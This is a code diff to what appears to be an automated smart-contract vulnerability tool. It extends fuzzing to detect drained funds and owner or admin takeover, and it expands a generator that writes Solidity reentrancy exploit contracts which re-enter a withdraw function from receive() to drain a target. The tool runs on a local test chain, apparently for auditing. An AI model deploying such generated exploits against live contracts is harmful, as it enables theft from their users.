@@ -1196,6 +1196,7 @@ def _run_effect(name, target_src, exploit_src, manifest):
     # pre-snapshot
     b0 = w3.eth.get_balance(taddr)
     o0 = tc.functions.owner().call() if _has_getter(abi,"owner") else None
+    adm0 = tc.functions.admin().call() if _has_getter(abi,"admin") else None
     debt0 = tc.functions.totalDebt().call() if _has_getter(abi,"totalDebt") else None
     col0 = tc.functions.totalCollateral().call() if _has_getter(abi,"totalCollateral") else None
     steps=[{"step":"deploy_target","title":"타깃 배포 (불변식 자동 합성)","address":taddr,
@@ -1214,11 +1215,13 @@ def _run_effect(name, target_src, exploit_src, manifest):
     # post-snapshot + effect decision
     b1 = w3.eth.get_balance(taddr)
     o1 = tc.functions.owner().call() if _has_getter(abi,"owner") else None
+    adm1 = tc.functions.admin().call() if _has_getter(abi,"admin") else None
     debt1 = tc.functions.totalDebt().call() if _has_getter(abi,"totalDebt") else None
     col1 = tc.functions.totalCollateral().call() if _has_getter(abi,"totalCollateral") else None
     reasons=[]
     if b1 < b0: reasons.append(f"funds drained ({(b0-b1)/1e18:g} ETH)")
     if o0 is not None and o1 is not None and o0 != o1: reasons.append("owner hijacked")
+    if adm0 is not None and adm1 is not None and adm0 != adm1: reasons.append("admin hijacked")
     if debt1 is not None and col1 is not None and debt1 > col1: reasons.append("debt > collateral")
     exploited = len(reasons) > 0
     steps.append({"step":"verify","title":"효과 관찰 (자동 합성 불변식)",
@@ -1302,11 +1305,22 @@ def _fuzz_codegen(seq, payable_map):
             "    function run(address t) external payable {\n"+"\n".join(calls)+"\n    }\n"
             "    receive() external payable {}\n}\n")
 
-def _fuzz_search(name, target_src, invariants_src, manifest, do_verify, budget=500):
+def _rw_vars(body):
+    """함수 본문에서 쓰는(write)·읽는(read) 상태 식별자를 추출한다. 완벽한 데이터
+    의존 분석은 아니지만, SliSE 류 슬라이싱의 저비용 근사로 시퀀스 우선순위에 쓴다."""
+    writes = set(re.findall(r"\b(\w+)\s*(?:\[[^\]]*\])?\s*(?:=|\+=|-=)", body))
+    reads = set(re.findall(r"\b([A-Za-z_]\w*)\b", body)) - writes
+    return writes, reads
+
+
+def _fuzz_search(name, target_src, invariants_src, manifest, do_verify, budget=None):
     """Deploy target once, snapshot, search single + (setup->drain) pairwise call
     sequences that trip the invariant/effect. Returns (seq, payable_map, reason) or None."""
     import solcx
     from web3 import Web3
+    if budget is None:
+        try: budget = int(os.environ.get("TRUST404_FUZZ_BUDGET", "500"))
+        except Exception: budget = 500
     _ensure_solc()
     files={f"{name}.sol":target_src}
     if do_verify and invariants_src: files["Invariants_src.sol"]=invariants_src
@@ -1344,6 +1358,7 @@ def _fuzz_search(name, target_src, invariants_src, manifest, do_verify, budget=5
         inv,_=deploy(arts[inv_name])
         if inv.functions.checkAll(taddr).call()[0] is not True: return None
     owner0 = tc.functions.owner().call() if _has_getter(abi,"owner") else None
+    admin0 = tc.functions.admin().call() if _has_getter(abi,"admin") else None
     base_bal=w3.eth.get_balance(taddr)
     has_debt=_has_getter(abi,"totalDebt") and _has_getter(abi,"totalCollateral")
     def checker():
@@ -1353,6 +1368,7 @@ def _fuzz_search(name, target_src, invariants_src, manifest, do_verify, budget=5
         reasons=[]
         if w3.eth.get_balance(taddr) < base_bal: reasons.append(f"funds drained ({(base_bal-w3.eth.get_balance(taddr))/1e18:g} ETH)")
         if owner0 is not None and tc.functions.owner().call()!=owner0: reasons.append("owner hijacked")
+        if admin0 is not None and tc.functions.admin().call()!=admin0: reasons.append("admin hijacked")
         if has_debt and tc.functions.totalDebt().call() > tc.functions.totalCollateral().call(): reasons.append("debt > collateral")
         return (len(reasons)>0, "; ".join(reasons))
     tester=w3.provider.ethereum_tester; snap=tester.take_snapshot()
@@ -1366,6 +1382,20 @@ def _fuzz_search(name, target_src, invariants_src, manifest, do_verify, budget=5
     # Ethernaut Fallback 류(직접 송금으로 owner 탈취)를 잡기 위함.
     raw_calls=[{"name":"__raw_send__","types":[],"args":[],"value":v,"raw":True} for v in (1, 10**15 - 1, 10**18)]
     all_calls = all_calls + raw_calls
+    # ── SliSE 류 슬라이싱 근사: 값-이동/권한 함수(sink)가 읽는 상태를 쓰는 함수
+    # (setup)를 먼저 시도하도록 all_calls 를 우선순위화한다(데이터 의존 기반). ──
+    src_fns = {f["name"]: f for f in _functions(_strip(target_src))}
+    rw = {n: _rw_vars(f["body"]) for n, f in src_fns.items()}
+    sink_reads = set()
+    for n, (w, rd) in rw.items():
+        if n in movers or re.search(r"\bowner\b|\badmin\b", " ".join(rw[n][0])):
+            sink_reads |= rd
+    def _prio(c):
+        if c.get("raw"):
+            return 1  # receive/fallback 트리거는 중간 우선순위
+        w = rw.get(c["name"], (set(), set()))[0]
+        return 2 if (w & sink_reads) else 0  # sink 가 읽는 상태를 쓰면 먼저
+    all_calls.sort(key=_prio, reverse=True)
     def do_call(c):
         if c.get("raw"):
             w3.eth.send_transaction({"from":acct,"to":taddr,"value":c["value"],"gas":300_000}); return
@@ -1406,16 +1436,32 @@ def _synth_reentrancy(target_src):
         if not f.get("external"):
             continue
         b = f["body"]
-        if f["payable"] and re.search(r"\w+\[\s*msg\.sender\s*\]\s*\+=\s*msg\.value", b) and not f["args"]:
-            deposits.append(f)
+        # 예치 후보: payable 이고 어떤 원장에 msg.value 를 적립한다. msg.sender 에게
+        # 적립하면 무인자 호출, address 인자에게 적립하면 그 인자에 address(this).
+        if f["payable"] and re.search(r"\w+\[[^\]]+\]\s*\+=\s*msg\.value", b):
+            credits_sender = bool(re.search(r"\w+\[\s*msg\.sender\s*\]\s*\+=\s*msg\.value", b))
+            addr_args = [an for (t, an) in f["args"] if t == "address"]
+            if credits_sender and not f["args"]:
+                deposits.append({"fn": f, "form": "self"})
+            elif addr_args:
+                deposits.append({"fn": f, "form": "addr"})
+            elif credits_sender:
+                deposits.append({"fn": f, "form": "self"})
         # 인출 후보: 값을 보내는 external 함수 (수신자·금액 표현식 무관). 무인자 또는 uint 1개.
         if re.search(r"\.call\s*\{\s*value\s*:", b):
             if len(f["args"]) == 0 or (len(f["args"]) == 1 and f["args"][0][0].startswith("uint")):
                 withdraws.append(f)
     out = []
     for dep in deposits[:3]:
+        depfn = dep["fn"]
+        if dep["form"] == "addr":
+            dep_sig = f"function {depfn['name']}(address) external payable;"
+            dep_call = f"t.{depfn['name']}{{value: unit}}(address(this));"
+        else:
+            dep_sig = f"function {depfn['name']}() external payable;"
+            dep_call = f"t.{depfn['name']}{{value: unit}}();"
         for wd in withdraws[:4]:
-            if wd["name"] == dep["name"]:
+            if wd["name"] == depfn["name"]:
                 continue
             amt = len(wd["args"]) == 1
             wsig = (f"function {wd['name']}(uint256 amount) external;" if amt
@@ -1425,21 +1471,21 @@ def _synth_reentrancy(target_src):
                 "// Strategy: reentrancy synthesis (fuzz) — deposit, then re-enter the\n"
                 "// value-returning function from receive() before the ledger clears.\n"
                 "interface ITarget {\n"
-                f"    function {dep['name']}() external payable;\n"
+                f"    {dep_sig}\n"
                 f"    {wsig}\n"
                 "}\n\n"
                 "contract Exploit {\n"
                 "    ITarget t; uint256 unit; uint256 depth;\n"
                 "    function run(address _t) external payable {\n"
                 "        t = ITarget(_t); unit = 1 ether;\n"
-                f"        t.{dep['name']}{{value: unit}}();\n"
+                f"        {dep_call}\n"
                 f"        {wcall}\n"
                 "    }\n"
                 "    receive() external payable {\n"
                 f"        if (depth < 32 && address(t).balance >= unit) {{ depth++; {wcall} }}\n"
                 "    }\n"
                 "}\n")
-            out.append((f"reentrancy-fuzz:{dep['name']}→{wd['name']}", code))
+            out.append((f"reentrancy-fuzz:{depfn['name']}→{wd['name']}", code))
     return out
 
 
